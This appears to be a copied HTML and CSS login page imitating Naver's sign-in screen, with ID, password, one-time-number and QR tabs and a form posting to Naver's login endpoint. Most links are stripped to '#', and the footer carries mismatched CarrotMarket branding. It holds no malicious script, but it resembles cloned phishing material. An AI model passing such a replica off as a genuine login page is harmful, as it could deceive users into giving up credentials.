
.sns_wrap li+li .sns_item {
    margin-left: 9px
}

.sns_wrap li:nth-child(1) .sns_text::before,.sns_wrap li:nth-child(2) .sns_text::before,.sns_wrap li:nth-child(3) .sns_text::before {
    content: '';
    position: absolute;
    top: 0;
    left: 0;
    background-position: -50px -203px;
    background-repeat: no-repeat;
    width: 23px;
    height: 22px
}

.sns_wrap li:nth-child(2) .sns_text::before {
    background-position: 0 -203px;
    background-repeat: no-repeat;
    width: 23px;
    height: 22px
}

.sns_wrap li:nth-child(3) .sns_text::before {
    background-position: -25px -203px;
    background-repeat: no-repeat;
    width: 23px;
    height: 22px
}

.sns_wrap .sns_item {
    display: block;
    padding: 18px 14px;
    border-radius: 6px;
    box-shadow: 0 5px 8px 0 rgba(68,68,68,.04);
    border: solid 1px #dadada;
    background-color: #fff
}

.sns_wrap .sns_text {
    position: relative;
    display: block;
    padding-left: 40px;
    font-size: 18px;
    font-weight: 500;
    color: #000;
    word-break: break-all
}

.nudge_banner {
    position: absolute;
    top: -17px;
    right: -37px;
    height: 25px;
    padding: 4px 20px 3px 9px;
    border-radius: 12px;
    box-shadow: 0 2px 4px 0 rgba(0,0,0,.1);
    border: solid 1px #fe7f41;
    background-color: #fff;
    box-sizing: border-box;
    z-index: 10
}

.nudge_banner .nudge_text {
    display: inline-block;
    font-size: 10px;
    font-weight: 500;
    line-height: 14px;
    letter-spacing: -.56px;
    white-space: nowrap;
    color: #fe7f41;
    vertical-align: top
}

.nudge_banner .nudge_close {
    position: absolute;
    top: -2px;
    right: 0;
    width: 24px;
    height: 25px
}

.nudge_banner .nudge_close .icon_nudge_close {
    display: hidden;
    background-position: -198px -91px;
    background-repeat: no-repeat;
    width: 9px;
    height: 9px
}

.banner_wrap {
    width: 460px;
    height: 147px;
    margin: 0 auto;
    text-align: center
}

.banner_inner {
    display: inline-block;
    box-sizing: border-box
}

.banner_inner img {
    vertical-align: top
}

@media (max-width: 632px) {
    .banner_wrap,.login_wrap,.sns_wrap {
        width:100%;
        padding: 0 40px;
        box-sizing: border-box
    }
}

@media (max-width: 470px) {
    .menu_id .menu_text,.menu_ones .menu_text,.menu_qr .menu_text {
        padding-left:24px
    }

    .menu_id .menu_text .text,.menu_ones .menu_text .text,.menu_qr .menu_text .text {
        display: none
    }

    .nudge_banner {
        display: none
    }
}

@media (max-width: 320px) {
    .login_wrap,.sns_wrap {
        padding:0 20px
    }
}
    
    </style>
</head>
<body>
<div id="wrap" class="wrap">
    <div class="u_skip"><a href="#">본문 바로가기</a></div>
    <header class="header" role="banner" >
        <div class="header_inner">
            <a   href="#" class="logo">
                <h1 class="blind">NAVER</h1>
            </a>
            <div class="lang" id="show_locale_switch">
                <select id="locale_switch" name="locale_switch" title="언어선택" class="sel">
                    <option value="ko_KR">한국어</option>
                    <option value="en_US">English</option>
                    <option value="zh-Hans_CN">中文(简体)</option>
                    <option value="zh-Hant_TW">中文(台灣)</option>
                </select>
            </div>
        </div>
    </header>

    <div id="container" class="container">
        <!-- content -->
        <div class="content">
            <div class="login_wrap">
                <ul class="menu_wrap" role="tablist">
                    <li class="menu_item" role="presentation">
                        <!--[주] 탭메뉴 활성화시(=선택시) "on"을 추가해주세요. 접근성: ariaselected는 탭 선택시 true, 미선택시 false로 적용-->
                        <!--[주:접근성] 탭메뉴의 id 값과 탭내용의 ariacontrols를 연결하고 있습니다. -->
                        <a href="#none" id="loinid" class="menu_id on" role="tab" aria-selected="true">
                            <span class="menu_text"><span class="text">ID 로그인</span></span>
                        </a>
                    </li>
                    <li class="menu_item" role="presentation">
                        <a href="#none" id="ones" class="menu_ones" role="tab" aria-selected="false">
                            <span class="menu_text"><span class="text">일회용 번호</span></span>
                        </a>
                    </li>
                    <li class="menu_item" role="presentation">
                        <a href="#none" id="qrcode" class="menu_qr" role="tab" aria-selected="false">
                            <span class="menu_text"><span class="text">QR코드</span></span>
                        </a>
                        <!--넛지배너-->
                        <div class="nudge_banner" id="nudge_tooltip">
                            <span class="nudge_text">PC방 등 공용PC라면 QR코드 로그인이 더 안전해요.</span>
                            <button type="button" id="nudge_close" class="nudge_close"><span
                                        class="icon_nudge_close"></span></button>
                        </div>
                    </li>
                </ul>
                <form id="frmNIDLogin" name="frmNIDLogin" target="_top" AUTOCOMPLETE="off"
                      action="https://nid.naver.com/nidlogin.login" method="POST">
                    <input type="hidden" id="localechange" name="localechange" value="">
                    <input type="hidden" name="dynamicKey" id="dynamicKey" value="4GnUQ6_5Boub8haqjJn4Z6RY0cTYdNNOyMINvLk2_Es0mxsqysARHj5FCz-ywxpfcFF92RW3uiJDkn8J41mpD9HCFNfwsLQNynh4LyLJ2Cs">
                    <input type="hidden" name="encpw" id="encpw" value="">
<input type="hidden" name="enctp" id="enctp" value="1">
<input type="hidden" name="svctype" id="svctype" value="1">
<input type="hidden" name="smart_LEVEL" id="smart_LEVEL" value="1">
<input type="hidden" name="bvsd" id="bvsd" value="">
<input type="hidden" name="encnm" id="encnm" value="">
<input type="hidden" name="locale" id="locale" value="ko_KR">
<input type="hidden" name="url" id="url" value="https://www.naver.com">


                    <ul class="panel_wrap">
                        <li class="panel_item" style="display: block;">
                            <div class="panel_inner" role="tabpanel" aria-controls="loinid">
                                <div class="id_pw_wrap">
                                    <div class="input_row" id="id_line">
                                        <div class="icon_cell" id="id_cell">
                                            <span class="icon_id">
                                                <span class="blind">아이디</span>
                                            </span>
                                        </div>
                                        <input type="text" id="id" name="id" placeholder="아이디" title="아이디"
                                               class="input_text" maxlength="41"
                                               value="">
                                        <span role="button" class="btn_delete" id="id_clear" style="display: none;">
                                            <span class="icon_delete">
												<span class="blind">삭제</span>
                                            </span>
                                        </span>
                                    </div>
                                    <div class="input_row" id="pw_line">
                                        <div class="icon_cell" id="pw_cell">
                                            <span class="icon_pw">
                                                <span class="blind">비밀번호</span>
                                            </span>
                                        </div>
                                        <input type="password" id="pw" name="pw" placeholder="비밀번호" title="비밀번호"
                                               class="input_text" maxlength="16">
                                        <span role="button" class="btn_delete" id="pw_clear" style="display: none;">
                                            <span class="icon_delete">
                                                <span class="blind">삭제</span>
                                            </span>
                                        </span>
                                    </div>
                                </div>
                                <div class="login_keep_wrap" id="login_keep_wrap">
                                    <div class="keep_check">
                                        <input type="checkbox" id="keep" name="nvlong"
                                               class="input_keep"  value="off">
                                        <label for="keep" class="keep_text">로그인 상태 유지</label>
                                    </div>
                                    <div class="ip_check">
                                        <a href="#" target="_blank" id="ipguide" title="IP보안"><span class="ip_text">IP보안</span></a>
                                        <span class="switch">
                                            <input type="checkbox" id="switch"
                                                   class="switch_checkbox" value="off">
                                            <label for="switch" class="switch_btn">
                                                <span class="blind" id="switch_blind">OFF</span>
                                            </label>
                                        </span>
                                    </div>
                                </div>

                                <div class="login_error_wrap" id="err_capslock" style="display: none;">
                                    <div class="error_message">
                                        <strong>CapsLock</strong>이 켜져 있습니다.
                                    </div>
                                </div>

                                <div class="login_error_wrap" id="err_empty_id" style="display: none;">
                                    <div class="error_message">
                                        <strong>아이디</strong>를 입력해 주세요.
                                    </div>
                                </div>

                                <div class="login_error_wrap" id="err_empty_pw" style="display: none;">
                                    <div class="error_message">
                                        <strong>비밀번호</strong>를 입력해 주세요.
                                    </div>
                                </div>
                                <div class="login_error_wrap" id="err_common"  style="display:none;">
                                    <div class="error_message"
                                         style="width:90%">
                                        
                                    </div>
                                </div>
                                <div class="btn_login_wrap">

                                    <button type="submit" class="btn_login" id="btn_login">
                                        <span class="btn_text" >로그인</span>
                                    </button>

                                </div>
                            </div>
                        </li>
                    </ul>
                </form>
            </div>
            <ul class="find_wrap" id="find_wrap">

                <li><a target="_blank" href="#"
                       class="find_text">비밀번호 찾기</a></li>
                <li><a target="_blank" href="#"
                       class="find_text">아이디 찾기</a></li>
                <li><a target="_blank" href="#" class="find_text">회원가입</a>
                </li>

            </ul>
            <!--배너-->
            <div id="gladbanner" class="banner_wrap">
                &nbsp;
            </div>
        </div>
        <!-- //content -->
    </div>

    <!-- footer -->
    <div class="footer">
        <div class="footer_inner">
            <!--[주]고객센터,제휴문의,서비스안내-->
            <ul class="footer_link" id="footer_link">
                <li><a target="_blank" class="footer_item" href="#"
                       id="fot.agreement"><span class="text">이용약관</span></a></li>
                <li><a target="_blank" class="footer_item" href="#"
                       id="fot.privacy"><span class="text"><strong>개인정보처리방침</strong></span></a></li>
                <li><a target="_blank" class="footer_item" href="#"
                       id="fot.disclaimer"><span class="text">책임의 한계와 법적고지</span></a></li>
                <li><a target="_blank" class="footer_item"
                       href="#" id="fot.help"><span
                                class="text">회원정보 고객센터</span></a></li>
            </ul>
            <div class="footer_copy">
                <a id="fot.naver" target="_blank" href="#">
                    <span class="footer_logo"><span class="blind">당근마켓</span></span>
                </a>
                <span class="text">Copyright</span>
                <span class="corp">© CarrotMarket Corp.</span>
                <span class="text">All Rights Reserved.</span>
            </div>		
        </div>
    </div>

</div>
<input type="hidden" id="nclicks_nsc" name="nclicks_nsc" value="nid.login_kr">
<input type="hidden" id="nid_buk" name="nid_buk" value="exist">
<input type="hidden" id="removeLink" name="removeLink" value="">
<input type="hidden" id="hide_util" name="hide_util" value="">
<input type="hidden" id="ncaptchaSplit" name="ncaptchaSplit" value="none">
<input type="hidden" id="id_error_msg" name="id_error_msg" value="<strong>아이디</strong>를 입력해주세요.">
<input type="hidden" id="pw_error_msg" name="pw_error_msg" value="<strong>비밀번호</strong>를 입력해주세요.">
<input type="hidden" id="locale" name="locale" value="ko_KR">
<input type="hidden" id="adult_surl_v2" name="adult_surl_v2" value="">
<input type="hidden" id="ispopup" name="ispopup" value="false">
<script type="text/javascript" src="/login/js/bvsd.1.3.9.min.js"></script>
<script type="text/javascript" async src="https://ssl.pstatic.net/tveta/libs/glad/prod/gfp-core.js"></script>
<script type="text/javascript" src="/login/js/v2/default/common_202201.js?v=20230217"></script>
<script type="text/javascript" src="/login/js/v2/default/default_202105.js?v=20230217"></script>
<div id="nv_stat" style="display:none;">20</div>
</body>
</html>